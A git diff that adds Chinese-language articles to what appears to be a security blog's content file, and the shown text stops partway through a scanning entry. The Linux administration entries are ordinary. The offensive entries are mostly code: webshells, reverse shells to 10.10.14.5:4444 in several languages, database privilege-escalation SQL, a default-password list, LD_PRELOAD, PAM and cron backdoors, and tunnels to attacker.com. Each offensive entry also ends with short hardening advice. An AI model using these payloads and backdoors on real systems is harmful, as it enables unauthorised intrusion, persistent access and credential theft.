@@ -9520,6 +9520,1991 @@ services:
 \`\`\`
     `
   },
+
+  // Linux 系统 - 补充
+  {
+    slug: 'linux-sources',
+    title: 'Linux 更换更新源',
+    date: '2026-06-20',
+    category: 'linux',
+    subcategory: 'linux-sources',
+    tags: ['Linux', '换源', '软件源'],
+    summary: 'CentOS、Ubuntu、Debian 系统更换软件源方法。',
+    content: `
+## 为什么换源
+
+默认源可能下载慢或不可用，更换为国内镜像源可提升速度。
+
+## CentOS 换源
+
+### 备份旧源
+
+\`\`\`bash
+cp /etc/yum.repos.d/CentOS-Base.repo /etc/yum.repos.d/CentOS-Base.repo.bak
+\`\`\`
+
+### 替换为阿里源
+
+\`\`\`bash
+# CentOS 7
+sed -i 's/mirrorlist/#mirrorlist/g' /etc/yum.repos.d/CentOS-*
+sed -i 's|#baseurl=http://mirror.centos.org|baseurl=http://mirrors.aliyun.com|g' /etc/yum.repos.d/CentOS-*
+
+# CentOS 8
+sed -i 's/metalink=/metalink=/g' /etc/yum.repos.d/CentOS-*
+sed -i 's|#baseurl=http://mirror.centos.org|baseurl=http://mirrors.aliyun.com|g' /etc/yum.repos.d/CentOS-*
+\`\`\`
+
+### 清除缓存并重建
+
+\`\`\`bash
+yum clean all
+yum makecache
+\`\`\`
+
+## Ubuntu 换源
+
+### 备份旧源
+
+\`\`\`bash
+cp /etc/apt/sources.list /etc/apt/sources.list.bak
+\`\`\`
+
+### 替换为阿里源（Ubuntu 20.04/22.04）
+
+\`\`\`bash
+cat > /etc/apt/sources.list << 'EOF'
+deb http://mirrors.aliyun.com/ubuntu/ focal main restricted universe multiverse
+deb http://mirrors.aliyun.com/ubuntu/ focal-updates main restricted universe multiverse
+deb http://mirrors.aliyun.com/ubuntu/ focal-backports main restricted universe multiverse
+deb http://mirrors.aliyun.com/ubuntu/ focal-security main restricted universe multiverse
+EOF
+\`\`\`
+
+### 更新
+
+\`\`\`bash
+apt update
+\`\`\`
+
+## Debian 换源
+
+### 备份并替换
+
+\`\`\`bash
+cp /etc/apt/sources.list /etc/apt/sources.list.bak
+
+cat > /etc/apt/sources.list << 'EOF'
+deb http://mirrors.aliyun.com/debian/ bookworm main contrib non-free non-free-firmware
+deb http://mirrors.aliyun.com/debian/ bookworm-updates main contrib non-free non-free-firmware
+deb http://mirrors.aliyun.com/debian/ bookworm-backports main contrib non-free non-free-firmware
+deb http://mirrors.aliyun.com/debian-security bookworm-security main contrib non-free non-free-firmware
+EOF
+\`\`\`
+
+### 更新
+
+\`\`\`bash
+apt update
+\`\`\`
+
+## 验证源是否生效
+
+\`\`\`bash
+# 查看当前源
+cat /etc/apt/sources.list
+yum repolist
+
+# 测试下载速度
+apt install vim
+\`\`\`
+
+## 流程图
+
+\`\`\`
+┌──────────────┐    ┌──────────────┐    ┌──────────────┐    ┌──────────────┐
+│ 1. 备份旧源   │───>│ 2. 替换源地址 │───>│ 3. 清除缓存   │───>│ 4. 重建缓存   │
+│ cp .bak      │    │ 阿里/清华/中科大│    │ clean all    │    │ makecache    │
+└──────────────┘    └──────────────┘    └──────────────┘    └──────────────┘
+       │                   │                   │                    │
+  保留回滚能力          修改源地址           删除旧缓存          生成新索引
+  防止配置丢失         使用国内镜像         避免冲突            验证可用性
+\`\`\`
+
+## 常用镜像源
+
+| 镜像 | 地址 |
+|------|------|
+| 阿里云 | mirrors.aliyun.com |
+| 清华 | mirrors.tuna.tsinghua.edu.cn |
+| 中科大 | mirrors.ustc.edu.cn |
+| 网易 | mirrors.163.com |
+| 华为 | mirrors.huaweicloud.com |
+
+## 安全加固
+
+- **验证 GPG 签名**：确保软件包完整性
+  \`\`\`bash
+  apt-key list                     # 查看已信任的密钥
+  rpm --import /etc/pki/rpm-gpg/RPM-GPG-KEY-CentOS-7
+  \`\`\`
+- **启用 HTTPS 源**：使用 https:// 替代 http:// 防止中间人攻击
+- **备份源配置**：修改前务必备份
+- **锁定关键包版本**：防止意外升级导致服务中断
+  \`\`\`bash
+  apt-mark hold nginx mysql-server
+  \`\`\`
+- **定期更新安全补丁**：配置 unattended-upgrades 自动安装安全更新
+    `
+  },
+  {
+    slug: 'linux-cron',
+    title: 'Linux 计划任务详解',
+    date: '2026-06-19',
+    category: 'linux',
+    subcategory: 'linux-cron',
+    tags: ['Linux', 'Crontab', '定时任务'],
+    summary: 'crontab 格式、管理方法和日志查看。',
+    content: `
+## Crontab 格式
+
+\`\`\`
+分 时 日 月 周 命令
+*  *  *  *  *  command
+
+分钟：0-59
+小时：0-23
+日期：1-31
+月份：1-12
+星期：0-7（0和7都是周日）
+\`\`\`
+
+## 常用示例
+
+\`\`\`bash
+# 每天凌晨3点执行
+0 3 * * * /path/to/script.sh
+
+# 每5分钟执行
+*/5 * * * * /path/to/script.sh
+
+# 每周一凌晨1点执行
+0 1 * * 1 /path/to/backup.sh
+
+# 每月1号执行
+0 0 1 * * /path/to/monthly.sh
+
+# 工作日执行
+0 9 * * 1-5 /path/to/workday.sh
+
+# 每隔2小时执行
+0 */2 * * * /path/to/check.sh
+\`\`\`
+
+## 管理命令
+
+\`\`\`bash
+crontab -e          # 编辑当前用户定时任务
+crontab -l          # 查看当前用户定时任务
+crontab -r          # 删除当前用户所有定时任务
+crontab -u user -e  # 编辑指定用户的定时任务
+crontab -u user -l  # 查看指定用户的定时任务
+\`\`\`
+
+## 系统级 Cron
+
+\`\`\`bash
+# 系统级 cron 文件
+/etc/crontab              # 系统 crontab
+/etc/cron.d/              # 自定义 cron 任务
+/etc/cron.daily/          # 每日执行
+/etc/cron.hourly/         # 每小时执行
+/etc/cron.weekly/         # 每周执行
+/etc/cron.monthly/        # 每月执行
+/etc/anacrontab           # anacron 配置
+\`\`\`
+
+## 日志查看
+
+\`\`\`bash
+# 查看 cron 日志
+grep CRON /var/log/syslog
+grep CRON /var/log/cron
+
+# 查看用户 cron 执行记录
+grep username /var/log/syslog | grep CRON
+
+# 查看 cron 启动日志
+systemctl status cron
+\`\`\`
+
+## 环境变量
+
+\`\`\`bash
+# crontab 中的环境变量有限
+# 建议在脚本中设置完整 PATH
+#!/bin/bash
+export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+cd /path/to/workdir
+./script.sh
+\`\`\`
+
+## 流程图
+
+\`\`\`
+┌──────────────┐    ┌──────────────┐    ┌──────────────┐    ┌──────────────┐
+│ 1. 编辑任务   │───>│ 2. 保存退出   │───>│ 3. cron守护   │───>│ 4. 执行命令   │
+│ crontab -e   │    │ :wq          │    │ crond 精确触发│    │ 记录日志     │
+└──────────────┘    └──────────────┘    └──────────────┘    └──────────────┘
+       │                   │                   │                    │
+  vim/nano编辑         自动安装到          每分钟检查           /var/log/syslog
+  格式正确性           /var/spool/cron     是否需要执行         记录执行结果
+\`\`\`
+
+## 常见问题
+
+\`\`\`bash
+# 1. 权限问题
+chmod 600 /var/spool/cron/crontabs/user
+
+# 2. 路径问题
+# 在 crontab 中使用绝对路径
+
+# 3. 输出重定向
+0 3 * * * /path/to/script.sh > /var/log/script.log 2>&1
+
+# 4. 防止重复执行
+flock -n /tmp/script.lock /path/to/script.sh
+\`\`\`
+
+## 安全加固
+
+- **限制 crontab 访问**：只允许指定用户使用
+  \`\`\`bash
+  echo "root" > /etc/cron.allow
+  echo "admin" >> /etc/cron.allow
+  chmod 600 /etc/cron.allow
+  \`\`\`
+- **设置 cron 目录权限**：
+  \`\`\`bash
+  chmod 700 /etc/cron.d
+  chmod 700 /etc/cron.daily
+  chmod 700 /etc/cron.hourly
+  \`\`\`
+- **审计所有 cron 任务**：定期检查异常任务
+  \`\`\`bash
+  for user in $(cut -f1 -d: /etc/passwd); do
+      echo "=== $user ===" && crontab -u $user -l 2>/dev/null
+  done
+  \`\`\`
+- **避免在 cron 中使用 wget|bash**：防止远程代码执行
+- **使用 flock 防止并发**：避免任务重叠执行
+- **监控 cron 执行失败**：设置告警通知
+    `
+  },
+  {
+    slug: 'linux-boot',
+    title: 'Linux 开机启动项',
+    date: '2026-06-18',
+    category: 'linux',
+    subcategory: 'linux-boot',
+    tags: ['Linux', '启动项', 'systemd'],
+    summary: 'systemd 服务、rc.local 和自启脚本管理。',
+    content: `
+## Systemd 启动服务
+
+### 查看所有启动服务
+
+\`\`\`bash
+systemctl list-unit-files --type=service
+systemctl list-unit-files --type=service --state=enabled
+\`\`\`
+
+### 管理服务
+
+\`\`\`bash
+systemctl enable service     # 开机启动
+systemctl disable service    # 禁用开机启动
+systemctl is-enabled service # 检查是否启用
+\`\`\`
+
+### 查看启动顺序
+
+\`\`\`bash
+systemd-analyze                     # 启动时间
+systemd-analyze blame               # 各服务耗时
+systemd-analyze critical-chain      # 关键链
+\`\`\`
+
+## 创建 Systemd 服务
+
+\`\`\`ini
+# /etc/systemd/system/myapp.service
+[Unit]
+Description=My Application
+After=network.target
+
+[Service]
+Type=simple
+ExecStart=/opt/myapp/start.sh
+Restart=always
+RestartSec=5
+User=appuser
+WorkingDirectory=/opt/myapp
+
+[Install]
+WantedBy=multi-user.target
+\`\`\`
+
+### 启用服务
+
+\`\`\`bash
+systemctl daemon-reload
+systemctl enable myapp
+systemctl start myapp
+systemctl status myapp
+\`\`\`
+
+## rc.local
+
+\`\`\`bash
+# 某些系统仍支持 /etc/rc.local
+#!/bin/bash
+/opt/myapp/start.sh &
+exit 0
+
+chmod +x /etc/rc.local
+\`\`\`
+
+## 自启脚本
+
+### /etc/rc.d/rc.local
+
+\`\`\`bash
+#!/bin/bash
+# 在所有服务启动后执行
+/opt/custom/startup.sh
+\`\`\`
+
+### Profile 脚本
+
+\`\`\`bash
+# /etc/profile.d/ 下的脚本在用户登录时执行
+cat > /etc/profile.d/custom.sh << 'EOF'
+export PATH=$PATH:/opt/myapp/bin
+alias ll='ls -la'
+EOF
+\`\`\`
+
+## 启动流程
+
+\`\`\`
+┌──────────────┐    ┌──────────────┐    ┌──────────────┐    ┌──────────────┐
+│ 1. BIOS/UEFI │───>│ 2. GRUB 引导 │───>│ 3. 内核加载   │───>│ 4. systemd   │
+│ 硬件初始化    │    │ 选择内核      │    │ 挂载根分区    │    │ 按顺序启动    │
+└──────────────┘    └──────────────┘    └──────────────┘    └──────────────┘
+       │                   │                   │                    │
+  POST自检           /boot/grub/grub.cfg     initrd加载          multi-user.target
+  硬件检测           内核参数传递           驱动加载             各服务按依赖启动
+\`\`\`
+
+## 排查启动问题
+
+\`\`\`bash
+# 查看启动失败的服务
+systemctl --failed
+
+# 查看服务日志
+journalctl -u myapp --since "10 min ago"
+
+# 查看 dmesg
+dmesg | tail -20
+
+# 查看启动时间线
+journalctl -b
+\`\`\`
+
+## 安全加固
+
+- **审计开机自启服务**：检查异常服务
+  \`\`\`bash
+  systemctl list-unit-files --state=enabled | grep -v -E '^(ssh|cron|network|systemd)'
+  \`\`\`
+- **禁用不必要的服务**：减少攻击面
+  \`\`\`bash
+  systemctl disable cups avahi-daemon bluetooth
+  \`\`\`
+- **保护 systemd 服务**：使用安全选项
+  \`\`\`ini
+  [Service]
+  ProtectSystem=strict
+  ProtectHome=true
+  NoNewPrivileges=true
+  PrivateTmp=true
+  \`\`\`
+- **限制服务用户**：使用专用低权限用户运行服务
+- **监控新增服务**：审计 \`\`/etc/systemd/system/\`\` 变更
+    `
+  },
+  {
+    slug: 'linux-daemon',
+    title: 'Linux 守护进程',
+    date: '2026-06-17',
+    category: 'linux',
+    subcategory: 'linux-daemon',
+    tags: ['Linux', '守护进程', 'systemd'],
+    summary: 'systemd 守护进程管理和编写服务方法。',
+    content: `
+## 什么是守护进程
+
+守护进程（Daemon）是在后台运行的特殊进程，通常在系统启动时启动，不与终端交互。
+
+## Systemd 服务管理
+
+### 基本操作
+
+\`\`\`bash
+systemctl start service       # 启动
+systemctl stop service        # 停止
+systemctl restart service     # 重启
+systemctl reload service      # 重载配置
+systemctl status service      # 查看状态
+\`\`\`
+
+### 开机自启
+
+\`\`\`bash
+systemctl enable service      # 开机启动
+systemctl disable service     # 禁用开机启动
+systemctl enable --now service # 启动并设置开机自启
+\`\`\`
+
+## 编写 Systemd 服务
+
+### Type 类型
+
+\`\`\`
+Type=simple    # 默认，主进程即服务
+Type=forking   # 守护进程，fork 后父进程退出
+Type=oneshot   # 一次性执行
+Type=notify    # 通知 systemd 就绪
+Type=dbus      # D-Bus 激活
+\`\`\`
+
+### 完整服务示例
+
+\`\`\`ini
+[Unit]
+Description=Nginx Web Server
+After=network.target
+Wants=network-online.target
+
+[Service]
+Type=forking
+PIDFile=/run/nginx.pid
+ExecStartPre=/usr/sbin/nginx -t
+ExecStart=/usr/sbin/nginx
+ExecReload=/bin/kill -s HUP $MAINPID
+ExecStop=/bin/kill -s QUIT $MAINPID
+Restart=on-failure
+RestartSec=5
+LimitNOFILE=65535
+
+[Install]
+WantedBy=multi-user.target
+\`\`\`
+
+### 安全选项
+
+\`\`\`ini
+[Service]
+# 文件系统保护
+ProtectSystem=strict          # 只读挂载 / 和 /usr
+ProtectHome=true              # 隐藏 /home
+ReadWritePaths=/var/lib/myapp # 允许写入的目录
+
+# 权限控制
+NoNewPrivileges=true          # 禁止提权
+PrivateTmp=true               # 独立 /tmp
+User=appuser                  # 低权限用户
+Group=appgroup
+
+# 资源限制
+MemoryMax=512M
+CPUQuota=50%
+LimitNOFILE=65535
+\`\`\`
+
+## 管理脚本
+
+\`\`\`bash
+# 查看所有自启服务
+systemctl list-unit-files --state=enabled
+
+# 查看服务依赖
+systemctl list-dependencies myapp.service
+
+# 查看服务日志
+journalctl -u myapp -f
+
+# 分析服务启动耗时
+systemd-analyze blame | head -10
+\`\`\`
+
+## 流程图
+
+\`\`\`
+┌──────────────┐    ┌──────────────┐    ┌──────────────┐    ┌──────────────┐
+│ 1. 编写服务   │───>│ 2. daemon-reload│──>│ 3. enable/start│─>│ 4. 验证状态   │
+│ .service文件  │    │ 重载配置      │    │ 启用并启动     │    │ status/logs  │
+└──────────────┘    └──────────────┘    └──────────────┘    └──────────────┘
+       │                   │                   │                    │
+  /etc/systemd/system    systemd识别新文件   创建符号链接         systemctl status
+  定义服务行为            重新读取配置       开机自动启动         journalctl -u
+\`\`\`
+
+## 安全加固
+
+- **使用专用用户运行**：禁止使用 root 运行非必要服务
+  \`\`\`bash
+  useradd -r -s /sbin/nologin myapp
+  \`\`\`
+- **启用保护选项**：使用 ProtectSystem、ProtectHome 等
+- **限制文件系统访问**：只挂载必要的目录
+- **禁用网络能力**：不需要网络的服务添加 \`\`ProtectControlGroups=true\`\`
+- **审计服务配置变更**：
+  \`\`\`bash
+  find /etc/systemd/system -newer /etc/hostname -type f 2>/dev/null
+  \`\`\`
+- **使用 systemd-analyze security 评分**：
+  \`\`\`bash
+  systemd-analyze security myapp.service
+  \`\`\`
+    `
+  },
+  // 攻防对抗 - 补充
+  {
+    slug: 'getshell',
+    title: 'Getshell 权限获取',
+    date: '2026-06-20',
+    category: 'attack-defense',
+    subcategory: 'getshell',
+    tags: ['渗透测试', 'Getshell', 'Webshell', '反弹Shell'],
+    summary: 'Webshell、反弹Shell 和一句话木马技术。',
+    content: `
+## Webshell
+
+### PHP 一句话
+
+\`\`\`php
+<?php eval($_POST['cmd']); ?>
+<?php system($_GET['cmd']); ?>
+<?php @eval($_POST['a']); ?>
+\`\`\`
+
+### JSP 一句话
+
+\`\`\`jsp
+<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
+\`\`\`
+
+### 中国菜刀/蚁剑连接
+
+\`\`\`
+URL: http://target/shell.php
+密码: cmd
+\`\`\`
+
+## 反弹 Shell
+
+### Bash
+
+\`\`\`bash
+bash -i >& /dev/tcp/10.10.14.5/4444 0>&1
+\`\`\`
+
+### Python
+
+\`\`\`python
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.5",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
+\`\`\`
+
+### Netcat
+
+\`\`\`bash
+nc -e /bin/sh 10.10.14.5 4444
+ncat -e /bin/bash 10.10.14.5 4444
+\`\`\`
+
+### PowerShell
+
+\`\`\`powershell
+$client = New-Object System.Net.Sockets.TCPClient("10.10.14.5",4444);
+$stream = $client.GetStream();
+[byte[]]$bytes = 0..65535|%{0};
+while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
+  $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);
+  $sendback = (iex $data 2>&1 | Out-String );
+  $sendback2 = $sendback + "PS " + (pwd).Path + "> ";
+  $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
+  $stream.Write($sendbyte,0,$sendbyte.Length);
+  $stream.Flush()
+};
+\`\`\`
+
+## 攻击流程
+
+\`\`\`
+┌──────────────┐    ┌──────────────┐    ┌──────────────┐    ┌──────────────┐
+│ 1. 信息收集   │───>│ 2. 漏洞利用   │───>│ 3. 上传Webshell│─>│ 4. 获取Shell │
+│ 目标探测      │    │ SQLi/RCE/UFP │    │ 一句话/大马    │    │ 蚁剑/菜刀    │
+└──────────────┘    └──────────────┘    └──────────────┘    └──────────────┘
+       │                   │                   │                    │
+  端口/指纹/目录       注入/上传/包含       加密/混淆          命令执行/文件管理
+  CMS识别/源码泄露    文件上传漏洞         免杀绕过           反弹Shell/提权
+\`\`\`
+
+## 工具
+
+| 工具 | 用途 |
+|------|------|
+| 蚁剑(AntSword) | Webshell 管理 |
+| 菜刀(Chopper) | Webshell 管理 |
+| 哥斯拉(Godzilla) | 加密 Webshell |
+| 冰蝎(Behinder) | 内存马 |
+| Netcat | 反弹Shell |
+| Socat | 高级反弹 |
+
+## 安全加固
+
+- **部署 WAF**：拦截 Webshell 上传和命令执行特征
+- **文件完整性监控**：使用 AIDE 监控 Web 目录变更
+  \`\`\`bash
+  aide --init && mv /var/lib/aide/aide.new.db /var/lib/aide/aide.db
+  \`\`\`
+- **禁用危险函数**：
+  \`\`\`php
+  # php.ini
+  disable_functions = exec,passthru,shell_exec,system,proc_open,popen
+  \`\`\`
+- **Web 目录不可执行**：
+  \`\`\`apache
+  # .htaccess
+  php_flag engine off
+  \`\`\`
+- **定期扫描 Webshell**：
+  \`\`\`bash
+  find /var/www -name "*.php" -newer /var/www/index.php
+  \`\`\`
+- **监控异常网络连接**：检测反弹 Shell 连接
+    `
+  },
+  {
+    slug: 'db-privesc',
+    title: '数据库权限提升',
+    date: '2026-06-19',
+    category: 'attack-defense',
+    subcategory: 'privesc',
+    tags: ['渗透测试', '数据库提权', 'MySQL', 'MSSQL'],
+    summary: 'MySQL、MSSQL、PostgreSQL 数据库提权方法。',
+    content: `
+## MySQL 提权
+
+### UDF 提权
+
+\`\`\`sql
+-- 查看 plugin 目录
+SHOW VARIABLES LIKE 'plugin_dir';
+
+-- 写入 UDF DLL
+SELECT 0x4d5a... INTO DUMPFILE 'C:/Windows/System32/udf.dll';
+
+-- 创建函数
+CREATE FUNCTION sys_exec RETURNS STRING SONAME 'udf.dll';
+
+-- 执行命令
+SELECT sys_exec('whoami');
+\`\`\`
+
+### MOF 提权
+
+\`\`\`sql
+-- 利用 Windows MOF 文件
+SELECT ... INTO DUMPFILE 'C:/Windows/System32/wbem/mof/autorun.mof'
+\`\`\`
+
+## MSSQL 提权
+
+### xp_cmdshell
+
+\`\`\`sql
+-- 启用 xp_cmdshell
+EXEC sp_configure 'show advanced options', 1;
+RECONFIGURE;
+EXEC sp_configure 'xp_cmdshell', 1;
+RECONFIGURE;
+
+-- 执行命令
+EXEC xp_cmdshell 'whoami';
+\`\`\`
+
+### 写入 Webshell
+
+\`\`\`sql
+-- 使用 OACreate 写文件
+EXEC sp_OACreate 'Scripting.FileSystemObject';
+-- 写入一句话木马到 Web 目录
+\`\`\`
+
+## PostgreSQL 提权
+
+### COPY 命令写文件
+
+\`\`\`sql
+-- 写入反弹 Shell 脚本
+COPY cmd_exec FROM '/tmp/reverse.sh';
+\`\`\`
+
+### 大对象写文件
+
+\`\`\`sql
+SELECT lo_import('/etc/passwd');
+UPDATE pg_largeobject SET data = decode('payload', 'hex') WHERE loid = 1;
+\`\`\`
+
+## 攻击流程
+
+\`\`\`
+┌──────────────┐    ┌──────────────┐    ┌──────────────┐    ┌──────────────┐
+│ 1. 数据库信息 │───>│ 2. 密码破解   │───>│ 3. 写文件/UDF │───>│ 4. 系统命令   │
+│ 版本/用户/权限│    │ 爆破/字典     │    │ 提权操作      │    │ whoami/提权   │
+└──────────────┘    └──────────────┘    └──────────────┘    └──────────────┘
+       │                   │                   │                    │
+  nmap/mysql_info      hydra/sqlmap       UDF/xp_cmdshell       系统命令执行
+  默认密码检测         配置文件读取       MOF/写文件            反弹Shell
+\`\`\`
+
+## 常见密码
+
+\`\`\`
+root:root
+root:123456
+root:password
+root:root123
+sa:sa
+sa:password
+\`\`\`
+
+## 安全加固
+
+- **禁止弱密码**：强制密码复杂度策略
+- **限制数据库用户权限**：使用最小权限原则
+- **禁用危险功能**：
+  \`\`\`sql
+  -- MySQL: 禁用 UDF
+  -- 移除 plugin 目录写权限
+  -- MSSQL: 禁用 xp_cmdshell
+  EXEC sp_configure 'xp_cmdshell', 0;
+  \`\`\`
+- **限制网络访问**：数据库端口不暴露到公网
+- **使用专用数据库用户**：避免使用 root/sa 运行应用
+- **审计数据库操作**：启用查询日志
+- **及时更新补丁**：修复已知提权漏洞
+    `
+  },
+  {
+    slug: 'persistence-tricks',
+    title: '权限维持高级技巧',
+    date: '2026-06-18',
+    category: 'attack-defense',
+    subcategory: 'persistence',
+    tags: ['渗透测试', '权限维持', '隐藏后门'],
+    summary: '隐藏后门、无文件后门和内核模块后门技术。',
+    content: `
+## 隐藏后门
+
+### SSH 转发后门
+
+\`\`\`bash
+# 利用 SSH LocalForward 建立隐蔽隧道
+# 在 authorized_keys 中添加命令限制
+command="ssh -L 3306:localhost:3306 dummy",no-agent-forwarding,no-X11-forwarding ssh-rsa AAAA...
+\`\`\`
+
+### LD_PRELOAD 后门
+
+\`\`\`bash
+# 编写共享库
+cat > /tmp/.preload.c << 'EOF'
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+__attribute__((constructor))
+void init() {
+    unsetenv("LD_PRELOAD");
+    system("/tmp/.backdoor &");
+}
+EOF
+
+# 编译
+gcc -shared -fPIC -o /tmp/.preload.so /tmp/.preload.c -nostartfiles
+
+# 配置加载
+echo "/tmp/.preload.so" > /etc/ld.so.preload
+\`\`\`
+
+### PAM 后门
+
+\`\`\`bash
+# 修改 /etc/pam.d/sshd
+auth optional pam_permit.so
+
+# 编写恶意 pam_mysql 模块
+# 在验证密码时记录凭据
+\`\`\`
+
+## 无文件后门
+
+### 内存执行
+
+\`\`\`bash
+# 利用 bash 内建功能
+bash -c 'echo "bash -i >& /dev/tcp/10.10.14.5/4444 0>&1" | at now + 1 minute'
+
+# 利用 crontab
+echo '* * * * * /bin/bash -c "bash -i >& /dev/tcp/10.10.14.5/4444 0>&1"' | crontab -
+\`\`\`
+
+### 环境变量后门
+
+\`\`\`bash
+# 在 .bashrc 中植入
+export PS1="$(/tmp/.trigger.sh 2>/dev/null)"
+\`\`\`
+
+## 内核模块后门
+
+### 编写 LKM
+
+\`\`\`c
+#include <linux/module.h>
+#include <linux/kernel.h>
+#include <linux/init.h>
+
+MODULE_LICENSE("GPL");
+
+static int __init backdoor_init(void) {
+    // 后门初始化
+    return 0;
+}
+
+static void __exit backdoor_exit(void) {
+    // 清理
+}
+
+module_init(backdoor_init);
+module_exit(backdoor_exit);
+\`\`\`
+
+### 隐藏模块
+
+\`\`\`bash
+# 编译安装
+make -C /lib/modules/$(uname -r)/build M=$(pwd) modules
+insmod backdoor.ko
+
+# 隐藏模块列表
+# 修改内核模块列表
+\`\`\`
+
+## 攻击流程
+
+\`\`\`
+┌──────────────┐    ┌──────────────┐    ┌──────────────┐    ┌──────────────┐
+│ 1. 获取初始   │───>│ 2. 部署后门   │───>│ 3. 隐藏痕迹   │───>│ 4. 持久控制   │
+│ root/shell   │    │ 多种后门      │    │ 清理日志      │    │ 定期回连     │
+└──────────────┘    └──────────────┘    └──────────────┘    └──────────────┘
+       │                   │                   │                    │
+  漏洞利用/Webshell   SSH/PAM/LD_PRELOAD    日志清理/隐藏       Crontab/Systemd
+  权限提升            内核模块/无文件       文件属性            多通道回连
+\`\`\`
+
+## 安全加固
+
+- **文件完整性监控**：使用 AIDE 监控关键文件
+  \`\`\`bash
+  aide --check
+  \`\`\`
+- **定期检查 LD_PRELOAD**：
+  \`\`\`bash
+  cat /etc/ld.so.preload
+  lsof | grep deleted
+  \`\`\`
+- **监控 PAM 模块变更**：
+  \`\`\`bash
+  rpm -Vpam && dpkg --verify libpam-modules
+  \`\`\`
+- **审计 SSH 配置**：
+  \`\`\`bash
+  cat ~/.ssh/authorized_keys | wc -l
+  diff /etc/ssh/sshd_config /etc/ssh/sshd_config.bak
+  \`\`\`
+- **内核模块审计**：
+  \`\`\`bash
+  lsmod | grep -v -E '^(ext4|xfs|overlay|br_netfilter)'
+  \`\`\`
+- **部署 EDR**：持续监控异常行为
+    `
+  },
+  {
+    slug: 'internal-tunnel',
+    title: '构建通道漫游内网',
+    date: '2026-06-17',
+    category: 'attack-defense',
+    subcategory: 'lateral',
+    tags: ['内网渗透', '隧道', '代理', '横向移动'],
+    summary: 'SSH 隧道、FRP、Chisel 和端口转发技术。',
+    content: `
+## SSH 隧道
+
+### 本地端口转发
+
+\`\`\`bash
+# 将本地 8080 端口转发到内网目标
+ssh -L 8080:192.168.1.100:80 user@jump-server
+
+# 访问 localhost:8080 即可访问 192.168.1.100:80
+\`\`\`
+
+### 远程端口转发
+
+\`\`\`bash
+# 将内网服务暴露到攻击机
+ssh -R 8080:192.168.1.100:80 user@attacker.com
+
+# 攻击机访问 localhost:8080 即可
+\`\`\`
+
+### 动态代理（SOCKS）
+
+\`\`\`bash
+# 创建 SOCKS5 代理
+ssh -D 1080 user@jump-server
+
+# 使用 proxychains
+proxychains nmap -sV 192.168.1.0/24
+\`\`\`
+
+## FRP
+
+### 服务端配置
+
+\`\`\`ini
+# frps.toml
+bindPort = 7000
+\`\`\`
+
+### 客户端配置
+
+\`\`\`ini
+# frpc.toml
+serverAddr = "attacker.com"
+serverPort = 7000
+
+[[proxies]]
+name = "ssh"
+type = "tcp"
+localIP = "127.0.0.1"
+localPort = 22
+remotePort = 6000
+
+[[proxies]]
+name = "socks5"
+type = "stcp"
+secretKey = "socks5key"
+localIP = "127.0.0.1"
+localPort = 1080
+\`\`\`
+
+## Chisel
+
+\`\`\`bash
+# 攻击机启动服务端
+chisel server --reverse --port 8080
+
+# 目标主机连接（反向SOCKS代理）
+chisel client attacker.com:8080 R:socks
+
+# 使用时
+proxychains curl http://192.168.1.100
+\`\`\`
+
+## 端口转发
+
+\`\`\`bash
+# socat
+socat TCP-LISTEN:8080,fork TCP:192.168.1.100:80
+
+# netcat
+nc -lvp 8080 -e /bin/sh
+\`\`\`
+
+## 流程图
+
+\`\`\`
+┌──────────────┐    ┌──────────────┐    ┌──────────────┐    ┌──────────────┐
+│ 1. 获取跳板   │───>│ 2. 建立隧道   │───>│ 3. 配置代理   │───>│ 4. 内网漫游   │
+│ 双网卡主机    │    │ SSH/FRP/Chisel│    │ SOCKS5       │    │ 扫描/渗透    │
+└──────────────┘    └──────────────┘    └──────────────┘    └──────────────┘
+       │                   │                   │                    │
+  多网卡/VPN          本地转发/动态代理      proxychains          内网资产发现
+  已控主机           隧道加密传输          Proxifier             横向移动
+\`\`\`
+
+## 常用工具
+
+| 工具 | 特点 |
+|------|------|
+| SSH | 系统自带，无需安装 |
+| FRP | 功能丰富，支持多种协议 |
+| Chisel | Go编写，轻量快速 |
+| Neo-reGeorg | HTTP隧道 |
+| EarthWorm | 多平台隧道工具 |
+
+## 安全加固
+
+- **监控异常隧道流量**：检测 SSH 隧道和代理特征
+- **限制出站连接**：防火墙限制非必要出站
+- **部署 NDR**：检测隧道协议特征
+- **限制跳板机访问**：最小权限原则
+- **监控 FRP/Chisel 等工具**：检测已知 C2 工具
+- **启用网络审计日志**：记录所有出站连接
+    `
+  },
+  {
+    slug: 'internal-recon2',
+    title: '横向移动-内网信息收集',
+    date: '2026-06-16',
+    category: 'attack-defense',
+    subcategory: 'lateral',
+    tags: ['内网渗透', '信息收集', 'fscan', '扫描'],
+    summary: 'fscan 扫描、存活探测和服务识别方法。',
+    content: `
+## fscan 扫描
+
+### 基本用法
+
+\`\`\`bash
+# 快速扫描 C 段
+fscan -h 192.168.1.0/24
+
+# 指定端口
+fscan -h 192.168.1.0/24 -p 80,443,445,3389,3306,6379
+
+# 全端口扫描
+fscan -h 192.168.1.0/24 -p 1-65535 -np
+\`\`\`
+
+### 指定命令
+
+\`\`\`bash
+# 执行远程命令
+fscan -h 192.168.1.100 -p 445 -c "whoami"
+
+# SMB 爆破
+fscan -h 192.168.1.0/24 -p 445 -u admin -pw password
+\`\`\`
+
+## 存活探测
+
+\`\`\`bash
+# nmap 主机发现
+nmap -sn 192.168.1.0/24
+
+# ICMP 扫描
+nmap -PE 192.168.1.0/24
+
+# ARP 扫描（同网段）
+nmap -PR 192.168.1.0/24
+
+# TCP SYN 发现
+nmap -PS22,80,443 192.168.1.0/24
+\`\`\`
+
+## 服务识别
+
+\`\`\`bash
+# 服务版本探测
+nmap -sV -p 80,443,445,3306,6379 192.168.1.0/24
+
+# 指纹识别
+nmap -O 192.168.1.100
+
+# SMB 枚举
+enum4linux -a 192.168.1.100
+
+# SNMP 枚举
+snmpwalk -v2c -c public 192.168.1.100
+\`\`\`
+
+## CobaltStrike 扫描
+
+\`\`\`
+# 端口扫描
+portscan 192.168.1.0/24 80,443,445,3389 arp
+
